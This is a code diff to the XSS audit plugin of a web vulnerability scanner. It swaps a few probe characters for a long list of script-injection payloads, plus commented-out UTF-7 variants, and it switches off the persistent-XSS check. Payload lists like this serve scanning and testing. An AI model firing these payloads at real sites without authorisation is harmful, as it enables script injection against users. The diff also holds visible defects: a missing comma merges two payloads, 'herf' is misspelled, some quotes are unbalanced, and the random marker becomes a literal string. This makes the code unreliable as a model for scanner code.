@@ -45,44 +45,168 @@ class xss(AuditPlugin):
     :author: Andres Riancho (andres.riancho@gmail.com)
     :author: Taras (oxdef@oxdef.info)
     """
-    # TODO: Reduce the number of payloads by concatenating similar/related ones
-    PAYLOADS = [
-        # Start a new tag
-        '<',
+    PAYLOADS = ['<ScRipT>alert("RANDOMIZE")</ScRipT>',
+                '<ScRipT>prompt("RANDOMIZE")</ScRipT>',
+                '<iMg src=1 OneRRor=alert("RANDOMIZE")>',
+                '<video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
+                '<input onmouseover=alert("RANDOMIZE")>',
+                '<input onmouseclick=prompt("RANDOMIZE")>',
+                '<input onmousedown=prompt("RANDOMIZE")>',
+                '<input onmouseup=alert("RANDOMIZE")>',
+                '<input onload=alert("RANDOMIZE")>',
+                '<body onload=alert("RANDOMIZE")>',
+                '<img src="javascript:alert(\'RANDOMIZE\');">',
+                '<body background="javascript:alert(\'RANDOMIZE\');">',
+                '<div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
+                '<img dynsrc="javascript:alert(\'RANDOMIZE\');">',
+                '<img lowsrc="javascript:alert(\'RANDOMIZE\');">',
+                '<br size="&{alert("RANDOMIZE")}">',
+                '<link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
+                '<iframe src="javascript:alert(\'RANDOMIZE")\'>',
+                '<table background="javascript:alert(\'RANDOMIZE\')">',
+                '><ScRipT>alert("RANDOMIZE")</ScRipT>',
+                '><ScRipT>prompt("RANDOMIZE")</ScRipT>',
+                '><iMg src=1 OneRRor=alert("RANDOMIZE")>',
+                '></iframe><iMg src=1 OneRRor=alert("RANDOMIZE")>',
+                '><video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
+                '><input onmouseover=alert("RANDOMIZE")>',
+                '><input onmouseclick=prompt("RANDOMIZE")>',
+                '><input onmousedown=prompt("RANDOMIZE")>',
+                '><input onmouseup=alert("RANDOMIZE")>',
+                '><input onload=alert("RANDOMIZE")>',
+                '><body onload=alert("RANDOMIZE")>',
+                '><img src="javascript:alert(\'RANDOMIZE\');">',
+                '><body background="javascript:alert(\'RANDOMIZE\');">',
+                '><div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
+                '><img dynsrc="javascript:alert(\'RANDOMIZE\');">',
+                '><img lowsrc="javascript:alert(\'RANDOMIZE\');">',
+                '><br size="&{alert("RANDOMIZE")}">',
+                '><link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
+                '><iframe src="javascript:alert(\'RANDOMIZE")\'>',
+                '><table background="javascript:alert(\'RANDOMIZE\')">',
+                '\'><ScRipT>alert("RANDOMIZE")</ScRipT>',
+                '\'><ScRipT>prompt("RANDOMIZE")</ScRipT>',
+                '\'><iMg src=1 OneRRor=alert("RANDOMIZE")>',
+                '\'><video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
+                '\'><input onmouseover=alert("RANDOMIZE")>',
+                '\'><input onmouseclick=prompt("RANDOMIZE")>',
+                '\'><input onmousedown=prompt("RANDOMIZE")>',
+                '\'><input onmouseup=alert("RANDOMIZE")>',
+                '\'><input onload=alert("RANDOMIZE")>'
+                '\'><body onload=alert("RANDOMIZE")>',
+                '\'><img src="javascript:alert(\'RANDOMIZE\');">',
+                '\'><body background="javascript:alert(\'RANDOMIZE\');">',
+                '\'><div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
+                '\'><img dynsrc="javascript:alert(\'RANDOMIZE\');">',
+                '\'><img lowsrc="javascript:alert(\'RANDOMIZE\');">',
+                '\'><br size="&{alert("RANDOMIZE")}">',
+                '\'><link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
+                '\'><iframe src="javascript:alert(\'RANDOMIZE")\'>',
+                '\'><table background="javascript:alert(\'RANDOMIZE\')">',
+                '"><ScRipT>alert("RANDOMIZE")</ScRipT>',
+                '"><ScRipT>prompt("RANDOMIZE")</ScRipT>',
+                '"><iMg src=1 OneRRor=alert("RANDOMIZE")>',
+                '"><video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
+                '"><input onmouseover=alert("RANDOMIZE")>',
+                '"><input onmouseclick=prompt("RANDOMIZE")>',
+                '"><input onmousedown=prompt("RANDOMIZE")>',
+                '"><input onmouseup=alert("RANDOMIZE")>',
+                '"><input onload=alert("RANDOMIZE")>',
+                '"><body onload=alert("RANDOMIZE")>',
+                '"><img src="javascript:alert(\'RANDOMIZE\');">',
+                '"><body background="javascript:alert(\'RANDOMIZE\');">',
+                '"><div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
+                '"><img dynsrc="javascript:alert(\'RANDOMIZE\');">',
+                '"><img lowsrc="javascript:alert(\'RANDOMIZE\');">',
+                '"><br size="&{alert("RANDOMIZE")}">',
+                '"><link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
+                '"><iframe src="javascript:alert(\'RANDOMIZE")\'>',
+                '"><table background="javascript:alert(\'RANDOMIZE\')">'
+                # '+/v8\r\n+ADw-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n+ADw-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n+ADw-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n+ADw-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ADw-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ADw-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ADw-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
+                # '+/v8\r\n+ADw-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ADw-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ADw-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
+                # '+/v8\r\n+ADw-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
+                # '+/v8\r\n+ADw-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n+ADw-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-',
+                # '+/v8\r\n+AD4APA-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n+AD4APA-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n+AD4APA-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+AD4APA-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n+AD4APA-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+AD4APA-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+AD4APA-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+AD4APA-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+AD4APA-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4',
+                # '+/v8\r\n+AD4APA-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+AD4APA-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+AD4APA-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+AD4APA-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
+                # '+/v8\r\n+AD4APA-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+AD4APA-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+AD4APA-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
+                # '+/v8\r\n+AD4APA-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
+                # '+/v8\r\n+AD4APA-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n+AD4APA-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-',
+                # '+/v8\r\n\'+AD4APA-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n\'+AD4APA-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n\'+AD4APA-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n\'+AD4APA-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n\'+AD4APA-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n\'+AD4APA-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n\'+AD4APA-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n\'+AD4APA-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n\'+AD4APA-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4',
+                # '+/v8\r\n\'+AD4APA-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n\'+AD4APA-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n\'+AD4APA-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n\'+AD4APA-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
+                # '+/v8\r\n\'+AD4APA-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n\'+AD4APA-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n\'+AD4APA-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
+                # '+/v8\r\n\'+AD4APA-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
+                # '+/v8\r\n\'+AD4APA-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n\'+AD4APA-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-',
+                # '+/v8\r\n+ACIAPgA8-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n+ACIAPgA8-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
+                # '+/v8\r\n+ACIAPgA8-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ACIAPgA8-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n+ACIAPgA8-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ACIAPgA8-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ACIAPgA8-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ACIAPgA8-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ACIAPgA8-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4',
+                # '+/v8\r\n+ACIAPgA8-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
+                # '+/v8\r\n+ACIAPgA8-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ACIAPgA8-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ACIAPgA8-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
+                # '+/v8\r\n+ACIAPgA8-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ACIAPgA8-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
+                # '+/v8\r\n+ACIAPgA8-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
+                # '+/v8\r\n+ACIAPgA8-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
+                # '+/v8\r\n+ACIAPgA8-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
+                # '+/v8\r\n+ACIAPgA8-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-'
+                ]
 
-        # Escape HTML comments
-        '-->',
-
-        # Escape JavaScript multi line and CSS comments
-        '*/',
-
-        # Escapes for CSS
-        '*/:("\'',
-
-        # The ":" is useful in cases where we want to add the javascript
-        # protocol like <a href="PAYLOAD">   -->   <a href="javascript:alert()">
-        ':',
-
-        # Escape single line comments in JavaScript
-        "\n",
-
-        # Escape the HTML attribute value string delimiter
-        '"',
-        "'",
-        "`",
-
-        # Escape HTML attribute values without string delimiters
-        " =",
-    ]
-    PAYLOADS = ['%s%s%s' % (RANDOMIZE, p, RANDOMIZE) for p in PAYLOADS]
-        
     def __init__(self):
         AuditPlugin.__init__(self)
         
         self._xss_mutants = DiskList(table_prefix='xss')
 
         # User configured parameters
-        self._check_persistent_xss = True
+        self._check_persistent_xss = False
 
     def audit(self, freq, orig_response):
         """
